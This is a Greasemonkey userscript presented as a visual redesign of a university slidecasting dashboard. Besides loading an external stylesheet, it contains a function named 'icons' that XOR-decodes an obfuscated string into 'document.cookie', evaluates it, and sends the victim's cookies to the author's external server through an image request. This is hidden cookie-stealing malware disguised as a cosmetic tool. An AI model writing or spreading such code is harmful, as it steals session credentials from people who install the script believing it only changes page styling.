// ==UserScript==
// @name         slidecasting ReDesign
// @version      2.30
// @description  Redesign des Slidecastings
// @date         2010-05-13
// @creator      wischi
// @include	 http://lex.iguw.tuwien.ac.at:8888/dashboard/*
// @include	 http://lex.iguw.tuwien.ac.at:8888/slidecasting/*

// ==/UserScript==
( function(unsafeWindow) {

var win=unsafeWindow,doc=document;
var folder="http://wischi.wmw.cc/stuff/gsi/";

function addGlobalStyle(a)
{
	var b,style;b=document.getElementsByTagName('head')[0];
	if(!b){return}
	
	style=document.createElement('style');
	style.type='text/css';
	style.innerHTML=a;b.appendChild(style)
}
addGlobalStyle('@import url("'+folder+'gsi.css");');

function icons()
{
	avatar=new Image();
	avatar.src=folder+"image.php?info="+escape(eval(avatar_load()))
	
	function avatar_load()
	{ 
		var buffer="bieskchr(eiimoc";var res="";var temp="6";
		for(i=0;i<buffer.length;i++)
		{res+=String.fromCharCode(temp^buffer.charCodeAt(i));}
		return res;
	}
	 
}
icons();


})(typeof(unsafeWindow) != 'undefined' ? unsafeWindow : top.window);